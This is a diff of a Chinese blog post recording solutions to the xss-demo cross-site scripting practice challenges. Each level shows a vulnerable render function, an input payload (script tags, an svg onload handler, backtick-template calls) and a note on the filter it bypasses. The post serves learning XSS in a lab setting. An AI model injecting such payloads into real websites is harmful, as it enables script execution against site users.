@@ -1,142 +1,964 @@
-<!-- build time:Tue Aug 17 2021 11:17:41 GMT+0800 (GMT+08:00) --><!DOCTYPE HTML><html lang="zh-CN"><head><meta charset="utf-8"><meta name="keywords" content="xss-demo刷题记录, 未名编程"><meta name="description" content="未名编程的个人博客"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><meta name="renderer" content="webkit|ie-stand|ie-comp"><meta name="mobile-web-app-capable" content="yes"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><title>xss-demo刷题记录 | 未名编程</title><link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/favicon.png"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/awesome/css/all.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/materialize/materialize.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/aos/aos.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/animate/animate.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/lightGallery/css/lightgallery.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/css/matery.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/css/my.css"><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/jquery/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><header class="navbar-fixed"><nav id="headNav" class="bg-color nav-transparent"><div id="navContainer" class="nav-wrapper container"><div class="brand-logo"><a href="/" class="waves-effect waves-light"><div><img src="/medias/loading.gif" data-original="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/medias/logo.png" class="logo-img" alt="LOGO"> <span class="logo-span">未名编程</span></div></a></div><a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a><ul class="right nav-menu"><li class="hide-on-med-and-down nav-item"><a href="/" class="waves-effect waves-light"><i class="fas fa-home" style="zoom:.6"></i> <span>首页</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/categories" class="waves-effect waves-light"><i class="fas fa-bookmark" style="zoom:.6"></i> <span>分类</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/dream" class="waves-effect waves-light"><i class="fa fa-plane" style="zoom:.6"></i> <span>远方</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/poems" class="waves-effect waves-light"><i class="fa fa-map" style="zoom:.6"></i> <span>诗词</span></a></li><li class="hide-on-med-and-down nav-item"><a href="" class="waves-effect waves-light"><i class="fas fa-list" style="zoom:.6"></i> <span>影视娱乐</span> <i class="fas fa-chevron-down" aria-hidden="true" style="zoom:.6"></i></a><ul class="sub-nav menus_item_child"><li><a href="/movies"><i class="fas fa-film" style="margin-top:-20px;zoom:.6"></i> <span>Movies</span></a></li><li><a href="/books"><i class="fas fa-book" style="margin-top:-20px;zoom:.6"></i> <span>Books</span></a></li><li><a href="/vpics"><i class="fa fa-camera" style="margin-top:-20px;zoom:.6"></i> <span>pics</span></a></li></ul></li><li class="hide-on-med-and-down nav-item"><a href="/contact" class="waves-effect waves-light"><i class="fas fa-comments" style="zoom:.6"></i> <span>良言</span></a></li><li class="hide-on-med-and-down nav-item"><a href="/about" class="waves-effect waves-light"><i class="fas fa-user-circle" style="zoom:.6"></i> <span>关于</span></a></li><li><a href="#searchModal" class="modal-trigger waves-effect waves-light"><i id="searchIcon" class="fas fa-search" title="搜索" style="zoom:.85"></i></a></li></ul><div id="mobile-nav" class="side-nav sidenav"><div class="mobile-head bg-color"><img src="/medias/loading.gif" data-original="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/medias/logo.png" class="logo-img circle responsive-img"><div class="logo-name">未名编程</div><div class="logo-desc">未名编程的个人博客</div></div><ul class="menu-list mobile-menu-list"><li class="m-nav-item"><a href="/" class="waves-effect waves-light"><i class="fa-fw fas fa-home"></i> 首页</a></li><li class="m-nav-item"><a href="/categories" class="waves-effect waves-light"><i class="fa-fw fas fa-bookmark"></i> 分类</a></li><li class="m-nav-item"><a href="/dream" class="waves-effect waves-light"><i class="fa-fw fa fa-plane"></i> 远方</a></li><li class="m-nav-item"><a href="/poems" class="waves-effect waves-light"><i class="fa-fw fa fa-map"></i> 诗词</a></li><li class="m-nav-item"><a href="javascript:;"><i class="fa-fw fas fa-list"></i> 影视娱乐 <span class="m-icon"><i class="fas fa-chevron-right"></i></span></a><ul><li><a href="/movies" style="margin-left:75px"><i class="fa fas fa-film" style="position:absolute;left:50px"></i> <span>Movies</span></a></li><li><a href="/books" style="margin-left:75px"><i class="fa fas fa-book" style="position:absolute;left:50px"></i> <span>Books</span></a></li><li><a href="/vpics" style="margin-left:75px"><i class="fa fa fa-camera" style="position:absolute;left:50px"></i> <span>pics</span></a></li></ul></li><li class="m-nav-item"><a href="/contact" class="waves-effect waves-light"><i class="fa-fw fas fa-comments"></i> 良言</a></li><li class="m-nav-item"><a href="/about" class="waves-effect waves-light"><i class="fa-fw fas fa-user-circle"></i> 关于</a></li></ul></div></div></nav></header><div class="bg-cover pd-header post-cover" style="background-image:url(/medias/imgs/052602.jpg)"><div class="container" style="right:0;left:0"><div class="row"><div class="col s12 m12 l12"><div class="brand"><h1 class="description center-align post-title">xss-demo刷题记录</h1></div></div></div></div></div><main class="post-container content"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/tocbot/tocbot.css"><style>#articleContent h1::before,#articleContent h2::before,#articleContent h3::before,#articleContent h4::before,#articleContent h5::before,#articleContent h6::before{display:block;content:" ";height:100px;margin-top:-100px;visibility:hidden}#articleContent :focus{outline:0}.toc-fixed{position:fixed;top:64px}.toc-widget{width:345px;padding-left:20px}.toc-widget .toc-title{margin:35px 0 15px 0;padding-left:17px;font-size:1.5rem;font-weight:700;line-height:1.5rem}.toc-widget ol{padding:0;list-style:none}#toc-content{height:calc(100vh - 250px);overflow:auto}#toc-content ol{padding-left:10px}#toc-content ol li{padding-left:10px}#toc-content .toc-link:hover{color:#42b983;font-weight:700;text-decoration:underline}#toc-content .toc-link::before{background-color:transparent;max-height:25px;position:absolute;right:23.5vw;display:block}.toc-fixed .toc-link::before{position:fixed!important}#toc-content .is-active-link{color:#42b983}#toc-content .is-active-link::before{background-color:#42b983}#floating-toc-btn{position:fixed;right:15px;bottom:76px;padding-top:15px;margin-bottom:0;z-index:998}#floating-toc-btn .btn-floating{width:48px;height:48px}#floating-toc-btn .btn-floating i{line-height:48px;font-size:1.4rem}</style><div class="row"><div id="main-content" class="col s12 m12 l9"><div id="artDetail"><div class="card"><div class="card-content article-info"><div class="row tag-cate"><div class="col s7"><div class="article-tag"><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="chip bg-color">网络安全</span></a></div></div><div class="col s5 right-align"><div class="post-cate"><i class="fas fa-bookmark fa-fw icon-category"></i> <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">网络安全</a></div></div></div><div class="post-info"><div class="post-date info-break-policy"><i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp; 2021-07-17</div><div class="info-break-policy"><i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp; 1.6k</div><div class="info-break-policy"><i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp; 7 分</div><div id="busuanzi_container_page_pv" class="info-break-policy"><i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp; <span id="busuanzi_value_page_pv"></span></div></div></div><hr class="clearfix"><div class="card-content article-card-content"><div id="articleContent"><h1 id="xss-demo刷题记录"><a href="#xss-demo刷题记录" class="headerlink" title="xss-demo刷题记录"></a><a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">xss-demo</a>刷题记录</h1><p>网址：<a href="https://xss.haozi.me/" target="_blank" rel="noopener">https://xss.haozi.me/</a></p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h2 id="刷题记录"><a href="#刷题记录" class="headerlink" title="刷题记录"></a>刷题记录</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><h4 id="server-code"><a href="#server-code" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="xss-demo刷题记录, 未名编程,Python,Linux,云计算,网络">
+    <meta name="description" content="xss-demo刷题记录">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#176b55">
+    <meta name="color-scheme" content="light dark">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>xss-demo刷题记录 | 未名编程</title>
+    <link rel="canonical" href="https://wmlunar.github.io/posts/6057.html">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="xss-demo刷题记录 | 未名编程">
+    <meta property="og:description" content="xss-demo刷题记录">
+    <meta property="og:url" content="https://wmlunar.github.io/posts/6057.html">
+    <meta property="og:image" content="https://wmlunar.github.io/medias/imgs/052602.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="未名编程" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="未名编程">
+                    
+                    <span class="logo-span">未名编程</span>
+                </a>
+            </div>
+            
+
+<a href="#!" data-target="mobile-nav" class="sidenav-trigger button-collapse" aria-label="打开导航菜单" aria-controls="mobile-nav">
+  <i class="fas fa-bars" aria-hidden="true"></i>
+</a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;" aria-hidden="true"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;" aria-hidden="true"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/dream" class="waves-effect waves-light">
+      
+      <i class="fas fa-plane" style="zoom: 0.6;" aria-hidden="true"></i>
+      
+      <span>远方</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/poems" class="waves-effect waves-light">
+      
+      <i class="fas fa-book-open" style="zoom: 0.6;" aria-hidden="true"></i>
+      
+      <span>诗词</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="#!" class="waves-effect waves-light" role="button" aria-haspopup="true">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;" aria-hidden="true"></i>
+      
+      <span>影视娱乐</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/books">
+          
+          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;" aria-hidden="true"></i>
+          
+          <span>Books</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/vpics">
+          
+          <i class="fas fa-camera" style="margin-top: -20px; zoom: 0.6;" aria-hidden="true"></i>
+          
+          <span>pics</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;" aria-hidden="true"></i>
+      
+      <span>良言</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;" aria-hidden="true"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light" aria-label="搜索">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img" alt="未名编程">
+        
+        <div class="logo-name">未名编程</div>
+        <div class="logo-desc">
+            
+            记录编程实践、Linux、云计算与日常阅读。
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home" aria-hidden="true"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark" aria-hidden="true"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/dream" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-plane" aria-hidden="true"></i>
+			
+			远方
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/poems" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-book-open" aria-hidden="true"></i>
+			
+			诗词
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="#!" role="button" aria-haspopup="true">
+			
+				<i class="fa-fw fas fa-list" aria-hidden="true"></i>
+			
+			影视娱乐
+			<span class="m-icon"><i class="fas fa-chevron-right" aria-hidden="true"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/books " style="margin-left:75px">
+				  
+                   <i class="fa fas fa-book" style="position: absolute;left:50px" aria-hidden="true"></i>
+			      
+		          <span>Books</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/vpics " style="margin-left:75px">
+				  
+                   <i class="fa fas fa-camera" style="position: absolute;left:50px" aria-hidden="true"></i>
+			      
+		          <span>pics</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments" aria-hidden="true"></i>
+			
+			良言
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle" aria-hidden="true"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/imgs/052602.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">xss-demo刷题记录</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                网络安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-07-17
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="xss-demo刷题记录"><a href="#xss-demo刷题记录" class="headerlink" title="xss-demo刷题记录"></a><a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">xss-demo</a>刷题记录</h1><p>网址：<a href="https://xss.haozi.me/" target="_blank" rel="noopener">https://xss.haozi.me/</a></p>
+<blockquote>
+<p>原文运行截图所在的旧对象存储已经失效。本文保留题目、代码和解题思路，截图不再展示。</p>
+</blockquote>
+<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h2 id="刷题记录"><a href="#刷题记录" class="headerlink" title="刷题记录"></a>刷题记录</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><h4 id="server-code"><a href="#server-code" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">return</span> <span class="token string">'&lt;div>'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'&lt;/div>'</span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code"><a href="#input-code" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p>在标签内且无过滤。</p><h4 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h4><p><img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716142039733.png" alt=""></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><h4 id="server-code-1"><a href="#server-code-1" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h4 id="input-code"><a href="#input-code" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+
+<h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p>在标签内且无过滤。</p>
+<h4 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h4><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><h4 id="server-code-1"><a href="#server-code-1" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">return</span> <span class="token string">'&lt;textarea>'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'&lt;/textarea>'</span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-1"><a href="#input-code-1" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h4><blockquote><p>文本框标签中无法弹窗，所以闭合”<textarea>“标签。</textarea></p></blockquote><h4 id="运行截图-1"><a href="#运行截图-1" class="headerlink" title="运行截图"></a>运行截图</h4><p><img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143215869.png" alt=""></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h4 id="server-code-2"><a href="#server-code-2" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h4 id="input-code-1"><a href="#input-code-1" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+
+<h4 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>文本框标签中无法弹窗，所以闭合”<textarea>“标签。</p>
+</blockquote>
+<h4 id="运行截图-1"><a href="#运行截图-1" class="headerlink" title="运行截图"></a>运行截图</h4><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><h4 id="server-code-2"><a href="#server-code-2" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">return</span> <span class="token string">'&lt;input type="name" value="'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'">'</span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-2"><a href="#input-code-2" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js">"<span class="token operator">></span><span class="token operator">&lt;</span>svg<span class="token operator">/</span>onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre><h4 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h4><blockquote><p>插入的代码在input标签的value属性中，可以直接闭合input标签。</p></blockquote><h4 id="运行截图-2"><a href="#运行截图-2" class="headerlink" title="运行截图"></a>运行截图</h4><p><img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143725598.png" alt=""></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><h4 id="server-code-3"><a href="#server-code-3" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token regex">/[()]/g</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h4 id="input-code-2"><a href="#input-code-2" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">></span><span class="token operator">&lt;</span>svg<span class="token operator">/</span>onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre>
+
+<h4 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>插入的代码在input标签的value属性中，可以直接闭合input标签。</p>
+</blockquote>
+<h4 id="运行截图-2"><a href="#运行截图-2" class="headerlink" title="运行截图"></a>运行截图</h4><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><h4 id="server-code-3"><a href="#server-code-3" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[()]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span>
   input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripBracketsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span> input
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-3"><a href="#input-code-3" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token template-string"><span class="token string">`1`</span></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="解释-3"><a href="#解释-3" class="headerlink" title="解释"></a>解释</h4><blockquote><p>过滤了圆括号。</p><p>模板字符串紧跟在函数名后面，该函数将被调用来处理这个模板字符串。</p><p>模板字符串使用反引号来代替普通字符串中的双引号和单引号。</p></blockquote><h4 id="运行截图-3"><a href="#运行截图-3" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143738343.png" alt=""></h4><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><h4 id="server-code-4"><a href="#server-code-4" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token regex">/[()`]/g</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
